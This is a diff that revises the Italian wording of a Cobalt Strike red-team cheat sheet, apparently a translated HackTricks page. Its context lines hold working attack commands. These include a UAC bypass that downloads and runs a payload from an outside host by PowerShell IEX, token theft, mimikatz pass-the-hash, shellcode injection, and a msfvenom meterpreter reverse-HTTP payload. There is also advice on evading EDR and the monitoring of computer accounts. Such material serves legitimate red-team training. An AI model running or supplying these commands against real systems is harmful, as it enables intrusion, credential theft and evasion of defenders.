@@ -43,10 +43,10 @@ execute-assembly </path/to/executable.exe>
 # Nota che per caricare assembly più grandi di 1MB, la proprietà 'tasks_max_size' del profilo malleable deve essere modificata.
 
 # Screenshots
-printscreen    # Fai uno screenshot singolo tramite il metodo PrintScr
-screenshot     # Fai uno screenshot singolo
-screenwatch    # Fai screenshot periodici del desktop
-## Vai su View -> Screenshots per vederli
+printscreen    # Scatta un singolo screenshot tramite il metodo PrintScr
+screenshot     # Scatta un singolo screenshot
+screenwatch    # Scatta screenshot periodici del desktop
+## Vai a View -> Screenshots per vederli
 
 # keylogger
 keylogger [pid] [x86|x64]
@@ -79,7 +79,7 @@ elevate uac-token-duplication <listener>
 runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
 
 ## Ruba token da pid
-## Come make_token ma ruba il token da un processo
+## Come make_token ma rubando il token da un processo
 steal_token [pid] # Inoltre, questo è utile per azioni di rete, non azioni locali
 ## Dalla documentazione API sappiamo che questo tipo di accesso "consente al chiamante di clonare il proprio token attuale". Questo è il motivo per cui l'output del Beacon dice Impersonated <current_username> - sta impersonando il nostro token clonato.
 ls \\computer_name\c$ # Prova a usare il token generato per accedere a C$ in un computer
@@ -91,7 +91,7 @@ spawnas [domain\username] [password] [listener] #Fallo da una directory con acce
 
 ## Inietta nel processo
 inject [pid] [x64|x86] [listener]
-## Dal punto di vista dell'OpSec: Non eseguire iniezioni cross-platform a meno che non sia davvero necessario (ad es. x86 -> x64 o x64 -> x86).
+## Da un punto di vista OpSec: Non eseguire iniezioni cross-platform a meno che non sia davvero necessario (es. x86 -> x64 o x64 -> x86).
 
 ## Pass the hash
 ## Questo processo di modifica richiede la patching della memoria LSASS che è un'azione ad alto rischio, richiede privilegi di amministratore locale e non è molto praticabile se il Protected Process Light (PPL) è abilitato.
@@ -101,7 +101,7 @@ pth [DOMAIN\user] [NTLM hash]
 ## Pass the hash tramite mimikatz
 mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
 ## Senza /run, mimikatz genera un cmd.exe, se stai eseguendo come utente con Desktop, vedrà la shell (se stai eseguendo come SYSTEM sei a posto)
-steal_token <pid> #Ruba il token dal processo creato da mimikatz
+steal_token <pid> #Ruba token dal processo creato da mimikatz
 
 ## Pass the ticket
 ## Richiedi un ticket
@@ -164,20 +164,20 @@ msf6 exploit(multi/handler) > exploit -j
 
 ## Su cobalt: Listeners > Aggiungi e imposta il Payload su Foreign HTTP. Imposta l'Host su 10.10.5.120, la Porta su 8080 e fai clic su Salva.
 beacon> spawn metasploit
-## Puoi solo generare sessioni Meterpreter x86 con il listener estero.
+## Puoi solo avviare sessioni Meterpreter x86 con il listener estero.
 
 # Pass session to Metasploit - Through shellcode injection
 ## Sul host metasploit
 msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
 ## Esegui msfvenom e prepara il listener multi/handler
 
-## Copia il file bin sul host cobalt strike
+## Copia il file bin nel host cobalt strike
 ps
-shinject <pid> x64 C:\Payloads\msf.bin #Inietta il codice shell di metasploit in un processo x64
+shinject <pid> x64 C:\Payloads\msf.bin #Inietta shellcode metasploit in un processo x64
 
 # Pass metasploit session to cobalt strike
 ## Genera shellcode Beacon stageless, vai su Attacks > Packages > Windows Executable (S), seleziona il listener desiderato, seleziona Raw come tipo di output e seleziona Usa payload x64.
-## Usa post/windows/manage/shellcode_inject in metasploit per iniettare il shellcode generato di cobalt strike
+## Usa post/windows/manage/shellcode_inject in metasploit per iniettare lo shellcode generato di cobalt strike
 
 
 # Pivoting
@@ -191,7 +191,7 @@ beacon> ssh 10.10.17.12:22 username password</code></pre>
 
 ### Execute-Assembly
 
-Il **`execute-assembly`** utilizza un **processo sacrificabile** utilizzando l'iniezione di processo remoto per eseguire il programma indicato. Questo è molto rumoroso poiché per iniettare all'interno di un processo vengono utilizzate alcune API Win che ogni EDR sta controllando. Tuttavia, ci sono alcuni strumenti personalizzati che possono essere utilizzati per caricare qualcosa nello stesso processo:
+Il **`execute-assembly`** utilizza un **processo sacrificabile** usando l'iniezione di processo remoto per eseguire il programma indicato. Questo è molto rumoroso poiché per iniettare all'interno di un processo vengono utilizzate alcune API Win che ogni EDR sta controllando. Tuttavia, ci sono alcuni strumenti personalizzati che possono essere utilizzati per caricare qualcosa nello stesso processo:
 
 - [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
 - [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
@@ -204,16 +204,16 @@ Lo script aggressore `https://github.com/outflanknl/HelpColor` creerà il comand
 
 Puoi controllare eventi come `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents`:
 
-- Security EID 4624 - Controlla tutti i logon interattivi per conoscere le abituali ore di lavoro.
-- System EID 12,13 - Controlla la frequenza di spegnimento/accensione/sospensione.
+- Security EID 4624 - Controlla tutti i logon interattivi per conoscere le ore di lavoro abituali.
+- System EID 12,13 - Controlla la frequenza di spegnimento/avvio/sospensione.
 - Security EID 4624/4625 - Controlla i tentativi NTLM validi/invalidi in entrata.
-- Security EID 4648 - Questo evento viene creato quando vengono utilizzate credenziali in chiaro per accedere. Se un processo lo ha generato, il binario potrebbe avere le credenziali in chiaro in un file di configurazione o all'interno del codice.
+- Security EID 4648 - Questo evento viene creato quando vengono utilizzate credenziali in chiaro per effettuare il login. Se un processo lo ha generato, il binario potrebbe avere le credenziali in chiaro in un file di configurazione o all'interno del codice.
 
 Quando usi `jump` da cobalt strike, è meglio usare il metodo `wmi_msbuild` per far sembrare il nuovo processo più legittimo.
 
 ### Use computer accounts
 
-È comune che i difensori controllino comportamenti strani generati dagli utenti ed **escludano gli account di servizio e gli account computer come `*$` dal loro monitoraggio**. Puoi utilizzare questi account per eseguire movimenti laterali o escalation dei privilegi.
+È comune che i difensori controllino comportamenti strani generati dagli utenti e **escludano gli account di servizio e gli account computer come `*$` dal loro monitoraggio**. Puoi utilizzare questi account per eseguire movimenti laterali o escalation dei privilegi.
 
 ### Use stageless payloads
 
@@ -223,7 +223,7 @@ I payload stageless sono meno rumorosi rispetto a quelli staged perché non hann
 
 Fai attenzione quando rubi o generi token perché potrebbe essere possibile per un EDR enumerare tutti i token di tutti i thread e trovare un **token appartenente a un utente diverso** o persino a SYSTEM nel processo.
 
-Questo consente di memorizzare i token **per beacon** in modo che non sia necessario rubare lo stesso token ripetutamente. Questo è utile per il movimento laterale o quando hai bisogno di utilizzare un token rubato più volte:
+Questo consente di memorizzare i token **per beacon** in modo da non dover rubare lo stesso token più e più volte. Questo è utile per il movimento laterale o quando hai bisogno di utilizzare un token rubato più volte:
 
 - token-store steal <pid>
 - token-store steal-and-use <pid>
@@ -280,7 +280,7 @@ Con il seguente comando Cobalt Strike, puoi specificare un processo diverso per 
 ```bash
 spawnto x86 svchost.exe
 ```
-Puoi anche cambiare questa impostazione **`spawnto_x86` e `spawnto_x64`** in un profilo.
+Puoi anche modificare questa impostazione **`spawnto_x86` e `spawnto_x64`** in un profilo.
 
 ### Proxying attackers traffic
 
@@ -296,6 +296,7 @@ Tuttavia, devi essere **attento al traffico generato**, poiché potresti inviare
 #### AV/AMSI/ETW Bypass
 
 Check the page:
+
 
 {{#ref}}
 av-bypass.md
